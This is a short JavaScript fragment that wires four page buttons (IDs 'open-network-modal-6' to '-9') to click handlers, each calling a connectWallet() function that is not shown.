const openNetworkModalBtn6 = document.getElementById('open-network-modal-6')
openNetworkModalBtn6.addEventListener('click', () => connectWallet())



const openNetworkModalBtn7 = document.getElementById('open-network-modal-7')
openNetworkModalBtn7.addEventListener('click', () => connectWallet())


const openNetworkModalBtn8 = document.getElementById('open-network-modal-8')
openNetworkModalBtn8.addEventListener('click', () => connectWallet())


const openNetworkModalBtn9 = document.getElementById('open-network-modal-9')
openNetworkModalBtn9.addEventListener('click', () => connectWallet())

